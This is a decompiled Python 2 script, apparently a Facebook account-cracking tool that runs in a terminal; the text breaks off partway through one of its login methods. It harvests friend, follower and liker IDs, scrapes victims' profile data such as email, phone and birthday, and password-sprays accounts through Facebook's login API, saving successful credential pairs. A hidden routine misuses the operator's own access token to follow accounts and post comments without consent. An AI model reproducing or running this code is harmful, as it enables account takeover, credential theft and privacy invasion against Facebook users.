# Decompile by  Red-Mafia
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-10-04 13:31:52.760327
import os
try:
    import requests
except ImportError:
    print '\n X> The requests module is not installed (requests) !...\n'
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print '\n X> The requests module is not installed (futures) !...\n'
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print '\n X> The requests module is not installed (bs4) !...\n'
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] remove token %s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)
logo = ' \x1b[0;92m FFFF U   U  CCC K  K \x1b[0m\n \x1b[0;91m F    U   U C    K K \x1b[0m || Author > TechQaiser\x1b[0m\n \x1b[0;92m FFF  U   U C    KK\x1b[0m   || Github.com/TechQaiser\x1b[0m\n  \x1b[0;91mF    U   U C    K K\x1b[0m  v1.91 || Fb > Muhammad Bilal\x1b[0m\n \x1b[0;92m F     UUU   CCC K  K\x1b[0m v1.91 || youtube > Tech Qaiser\x1b[0m'
lo_ngentod = '1714009362122228'
def hasil(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] CRacK DoNe...' % (N, K, N)
        print '\n\n [%sX>%s] total OK : %s%s%s' % (O, N, H, str(len(ok)), N)
        print ' [%sX>%s] total CP : %s%s%s' % (O, N, K, str(len(cp)), N)
        exit()
    else:
        print '\n\n [%s!%s]  opshh you are not getting results :(' % (M, N)
        exit()
def yayanxd():
    os.system('clear')
    print ' %sX%s This Tool Require Login Via Token \n %sX%s Do You Know How To Get Token Easly ?\n %sX%s Type %sopen%s To Get Token.' % (O, N, O, N, O, N, H, N)
    kontol = raw_input('\n %s[%sX%s] Token :%s ' % (N, M, N, H))
    if kontol in ('open', 'Open', 'OPEN'):
        os.system('xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi')
        raw_input(' \n%sX%s Enter Token ' % (O, N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
        print '\n\n %sX%s Welcome To Fucking World %s%s%s' % (O, N, K, Name, N)
        time.sleep(2)
        print ' %sX%s Dont Forg3t To Subscribe On Yt (  RED-MAFIA ) & I M Not Responsible For Miss Use ' % (O, N)
        time.sleep(2)
        open('.au/.memek.txt', 'w').write(kontol)
        raw_input(' %sX%s Press Enter To Continue :-  ' % (O, N))
        wuhan(kontol)
        os.system('xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%sO%s] Login Page >>>' % (N, M, N)
        time.sleep(2)
        yayanxd()
def moch_yayan():
    os.system('clear')
    try:
        kontol = open('.au/.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%sO>%s] Login Page ...' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .au/.memek.txt')
        yayanxd()
    try:
        Name = requests.get('https://graph.facebook.com/me?access_token=%s' % kontol).json()['name']
    except KeyError:
        print '\n %s[%sO>%s] Error Token  ' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .au/.memek.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] Connection Error\n' % (N, M, N))
    print logo
    IP = requests.get('http://ip-api.com/json').json()['query']
    print '___________________________________________________________\n'
    time.sleep(0.03)
    print ' (>) USER NAME : %s' % Name
    time.sleep(0.03)
    print ' (>) IP ANDRIOD   : %s' % IP
    print '___________________________________________________________\n'
    time.sleep(0.03)
    print ' [1]. Dump Id From Friends'
    print ' [2]. Dump Id From Public Friendlist'
    print ' [3]. Dump id From Followers'
    print ' [4]. Dump id From Posts Like'
    print ' [5]. Start Cloning '
    print ' [6]. Information Checker Fb '
    print ' [7]. Check Crack Results'
    print ' [8]. User Agent Setting'
    print ' [9]. Sub '
    print ' [0]. logout Token '
    pepek = raw_input('\n [>] menu : ')
    if pepek == '':
        print '\n %s[%s>%s] Please ! Fill Correctly!' % (N, M, N)
        time.sleep(2)
        moch_yayan()
    elif pepek in ('1', '01'):
        teman(kontol)
    elif pepek in ('2', '02'):
        publik(kontol)
    elif pepek in ('3', '03'):
        followers(kontol)
    elif pepek in ('4', '04'):
        postingan(kontol)
    elif pepek in ('5', '05'):
        __crack__().plerr()
    elif pepek in ('6', '06'):
        cek_ingfo(kontol)
    elif pepek in ('7', '07'):
        try:
            dirs = os.listdir('results')
            print '\n [ crack results Will Save On your File ]\n'
            time.sleep(0.2)
            for file in dirs:
                print ' [%s+%s] %s' % (O, N, file)
                time.sleep(0.2)
            file = raw_input('\n [%s?%s] Enter File Name : %s ' % (M, N, H))
            time.sleep(0.2)
            if file == '':
                file = raw_input('\n %s[%s?%s] Enter File Name :%s %s' % (N, M, N, H, N))
            total = open('results/%s' % file).read().splitlines()
            print ' %s[%s#%s] =\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=' % (N, O, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan(' [%s*%s] Results %sCrack%s On %s:%s%s%s total %s: %s%s%s' % (M, N, O, N, M, O, hps_nm, N, M, O, len(total), O))
            print ' %s[%s#%s] =\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=' % (N, O, N)
            time.sleep(2)
            for memek in total:
                kontol = memek.replace('\n', '')
                titid = kontol.replace(' [\xe2\x9c\x93] ', ' \x1b[0m[\x1b[1;92m\xe2\x9c\x93\x1b[0m]\x1b[1;92m ').replace(' [\xc3\x97] ', ' \x1b[0m[\x1b[1;93m\xc3\x97\x1b[0m]\x1b[1;93m ')
                print titid
                time.sleep(0.03)
            print ' %s[%s#%s] =\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=\xe2\x89\xa0=' % (N, O, N)
            raw_input('\n  [ %sBack%s ] ' % (O, N))
            moch_yayan()
        except IOError:
            print '\n %s[%s\xc3\x97%s] No Results Are There  ' % (N, M, N)
            raw_input('\n  [ %sBack%s ] ' % (O, N))
            moch_yayan()
    elif pepek in ('8', '08'):
        seting_yntkts()
    elif pepek in ('9', '09'):
        info_tools()
    elif pepek in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .au/.memek.txt')
        jalan('\n %s[%s\xe2\x9c\x93%s]%s SucessFully Logout ! Run Tool Again' % (N, H, N, H))
        exit()
    else:
        print '\n %s[%s\xc3\x97%s] menu [%s%s%s] Bro Check & Try Again ' % (N, M, N, M, pepek, N)
        time.sleep(2)
        moch_yayan()
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s' % (koh, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (lo_ngentod, kentod, kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s' % (xi_jimpinx, hoetank, kentod))
    except:
        pass
def teman(kontol):
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        mmk = raw_input('\n %s[%s?%s]  file Name: ' % (N, O, N))
        asw = raw_input(' %s[%s?%s]  ids Limit   : ' % (N, O, N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved ' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Output Results Done Copy This > ( %s%s%s )' % (O, N, M, cin, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Failed To Dump .\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
def publik(kontol):
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        csy = raw_input('\n %s[%s?%s] Public Id  : ' % (N, O, N))
        ahh = raw_input(' %s[%s?%s] File Name : ' % (N, O, N))
        ihh = raw_input(' %s[%s?%s] Ids Limit  : ' % (N, O, N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Process Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] Process Completed Ids Saved' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] Done Copy This File >  ( %s%s%s )' % (O, N, M, knt, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
def followers(kontol):
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        csy = raw_input('\n %s[%s?%s] Id follow  : ' % (N, O, N))
        mmk = raw_input(' %s[%s?%s] Name file  : ' % (N, O, N))
        asw = raw_input(' %s[%s?%s] Limit ids : ' % (N, O, N))
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully dump id from total followers' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] successfully Output Results Done Copy This File > ( %s%s%s )' % (O, N, M, ah, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:
        pass
    try:
        csy = raw_input('\n %s[%s?%s] Post Url : ' % (N, O, N))
        ppk = raw_input(' %s[%s?%s] Fiel Name : ' % (N, O, N))
        asw = raw_input(' %s[%s?%s] Ids Limit   : ' % (N, O, N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (csy, asw, kontol)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] Proses Dump Id...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)
        ys.close()
        jalan('\n\n %s[%s\xe2\x9c\x93%s] successfully dump id from Likes' % (N, H, N))
        print ' [%s\xe2\x80\xa2%s] successfully Output Results Done Copy This File > ( %s%s%s )' % (O, N, M, ahh, N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Dump Failed.\n' % (N, M, N))
        raw_input(' [ %sBack%s ] ' % (O, N))
        moch_yayan()
def cek_ingfo(kontol):
    try:
        user = raw_input('\n [%s+%s] Enter FB Id  : ' % (O, N))
        if user == '':
            print '\n [%s!%s] Fill Correctly !' % (M, N)
            cek_ingfo(kontol)
        x = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s' % (M, N)
    print '\n  * Fb Information*'
    time.sleep(0.03)
    print '\n [X>] FullName : %s' % nmaa
    time.sleep(0.03)
    try:
        ndpn = x['first_name']
    except (KeyError, IOError):
        ndpn = '%s-%s' % (M, N)
    print ' [X>] First name   : %s' % ndpn
    time.sleep(0.03)
    try:
        nmbl = x['last_name']
    except (KeyError, IOError):
        nmbl = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] LastName : %s' % nmbl
    time.sleep(0.03)
    try:
        hwhs = x['username']
    except (KeyError, IOError):
        hwhs = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] username  : %s' % hwhs
    time.sleep(0.03)
    try:
        asu = x['id']
    except (KeyError, IOError):
        asu = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] id facebook  : %s' % asu
    time.sleep(0.03)
    print '\n  * Data Fb Acc *\n'
    time.sleep(0.03)
    try:
        emai = x['email']
    except (KeyError, IOError):
        emai = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Gmail/Email facebook : %s' % emai
    time.sleep(0.03)
    try:
        nmrr = x['mobile_phone']
    except (KeyError, IOError):
        nmrr = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Number  : %s' % nmrr
    time.sleep(0.03)
    try:
        ttll = x['birthday']
        month, day, year = ttll.split('/')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
        year = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] DateOfBirth  : %s %s %s ' % (day, month, year)
    time.sleep(0.03)
    try:
        jenis = x['Gender'].replace('Female', 'Woman').replace('male', 'Laki-laki')
    except (KeyError, IOError):
        jenis = ''
    except:
        pass
    print ' [X>] Gender  : %s ' % jenis
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s' % (user, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:
        pass
    print ' [X>] Total Friends : %s' % str(len(id))
    time.sleep(0.01)
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s' % (user, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] total followers: %s' % pengikut
    time.sleep(0.03)
    try:
        lins = x['link']
    except (KeyError, IOError):
        lins = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Facebook Link : %s' % lins
    time.sleep(0.03)
    try:
        stas = x['relationship_status']
    except (KeyError, IOError):
        stas = '%s-%s' % (M, N)
    except:
        pass
    try:
        dgn = 'dengan %s' % x['significant_other']['name']
    except (KeyError, IOError):
        dgn = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Relation : %s %s' % (stas, dgn)
    time.sleep(0.03)
    try:
        bioo = x['about']
    except (KeyError, IOError):
        bioo = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] About Status : %s' % bioo
    time.sleep(0.03)
    try:
        dari = x['hometown']['name']
    except (KeyError, IOError):
        dari = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] HomeTown      : %s' % dari
    time.sleep(0.03)
    try:
        tigl = x['location']['name']
    except (KeyError, IOError):
        tigl = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Location     : %s' % tigl
    time.sleep(0.03)
    try:
        tzim = x['timezone']
    except (KeyError, IOError):
        tzim = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] TimeZone     : %s' % tzim
    time.sleep(0.03)
    try:
        jam = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split('-')
        month = bulan_ttl[month]
    except (KeyError, IOError):
        year = '%s-%s' % (M, N)
        month = '%s-%s' % (M, N)
        day = '%s-%s' % (M, N)
    except:
        pass
    print ' [X>] Last Update On %s Month %s Year %s Hour %s' % (day, month, year, jam)
    time.sleep(0.03)
    jalan('\n [%s\xe2\x9c\x93%s] SucessFully Checked Data Of Account !\n\n' % (O, N))
    raw_input('\n  [ %sBack%s ] ' % (O, N))
    moch_yayan()
def info_tools():
    os.system('clear')
    raw_input('\n  [ %sBack%s ] ' % (O, N))
    moch_yayan()
def seting_yntkts():
    print '\n (%s1%s) Change User Agent' % (O, N)
    print ' (%s2%s) Check User Agent' % (O, N)
    ytbjts = raw_input('\n %s[%s?%s] Select : ' % (N, O, N))
    if ytbjts == '':
        print '\n %s[%s\xc3\x97%s] Please ! Fill Correctly' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts == '1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts == '2':
        check_yntkts()
    else:
        print '\n %s[%s\xc3\x97%s] Input Correct ' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n %s(%s\xe2\x80\xa2%s) Search For UserAgent In Chrome For Cloning .' % (N, O, N)
    print ' (%s\xc3\x97%s) Type Any UserAgent Or Use My Agent ....\n' % (M, N)
    anjng = raw_input(' [%s?%s] Enter User Agent :%s ' % (O, N, H))
    if anjng == '':
        print '\n %s[%s\xc3\x97%s] Please ! Fill Correctly' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng)
        time.sleep(2)
        jalan('\n %s[%s\xe2\x9c\x93%s] Successfully Changed User Agent ...' % (N, H, N))
        raw_input('\n  %s[ %sBack%s ]' % (N, O, N))
        moch_yayan()
    except:
        pass
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
        user_agent = '%s-' % M
    except:
        pass
    print '\n %s[%s+%s] Your Agent : %s%s' % (N, O, N, H, user_agent)
    raw_input('\n  %s[ %sBack%s ]' % (N, O, N))
    moch_yayan()
class __crack__():
    def __init__(self):
        self.id = []
    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Input File: ' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id >> %s%s%s' % (O, N, M, len(self.id), N)
        except:
            print '\n %s[%s\xc3\x97%s] File [%s%s%s] No, dump id Found!' % (N, M, N, M, self.apk, N)
            time.sleep(3)
            moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] Do You Want To USE Manual Password ? [Y/t]: ' % (O, N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] use , (comma) for separator example: password123,password12345,etc. each word is at least 6 characters or more' % (N, M, N)
            while True:
                pwek = raw_input('\n [%s?%s] Enter PassWords : ' % (O, N))
                print ' [X>] crack with password -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s\xc3\x97%s] Fill Pass Doesnt Work In Empty ' % (N, M, N)
                elif len(pwek) <= 5:
                    print '\n %s[%s\xc3\x97%s] Pass Must Be 6 Character / Text ' % (N, M, N)
                else:
                    def __yan__(ysc=None):
                        global cp
                        global ok
                        cin = raw_input('\n [X>] method : ')
                        if cin == '':
                            print '\n %s[%s\xc3\x97%s] Fill Correctly ' % (N, M, N)
                            self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] Ok Results Saved To >> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            print ' [%s+%s] CP Results Saved To >> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            jalan('\n [%s!%s] You can Turn off Cellular Data to Pause The Crack Process \n' % (M, N))
                            time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass
                            os.remove(self.apk)
                            hasil(ok, cp)
                        elif cin == '2':
                            print '\n [%s+%s] Ok Results Saved To >> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            print ' [%s+%s] CP Results Saved To >> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            jalan('\n [%s!%s]  You can Turn off Cellular Data to Pause The Crack Process\n' % (M, N))
                            time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass
                            os.remove(self.apk)
                            hasil(ok, cp)
                        elif cin == '3':
                            print '\n [%s+%s] Ok Results Saved To >> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            print ' [%s+%s] CP Results Saved To >> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            time.sleep(0.2)
                            jalan('\n [%s!%s]  You can Turn off Cellular Data to Pause The Crack Process\n' % (M, N))
                            time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass
                            os.remove(self.apk)
                            hasil(ok, cp)
                        else:
                            print '\n %s[%s\xc3\x97%s] Input Correctlyb' % (N, M, N)
                            self.__yan__()
                    print '\n [ Select Method OF Cloning  ]\n'
                    print ' [%s1%s]. method API ( Fast )' % (O, N)
                    print ' [%s2%s]. method mbasic ( Slow )' % (O, N)
                    print ' [%s3%s]. method mobile ( Very Slow )' % (O, N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ Select Method OF Cloning  ]\n'
            print ' [%s1%s]. method API ( Fast )' % (O, N)
            print ' [%s2%s]. method mbasic ( Slow )' % (O, N)
            print ' [%s3%s]. method mobile ( Very Slow )' % (O, N)
            self.__pler__()
        else:
            print '\n %s[%s\xc3\x97%s] y/t Bro!' % (N, M, N)
            time.sleep(2)
            moch_yayan()
        return
    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r [%s*%s] [ cracking ] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36'
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _kontol, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* >>> %s|%s                 %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.au/.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* >>> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass
                print '\r  %s* >>> %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass
            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36'
            ses = requests.Session()
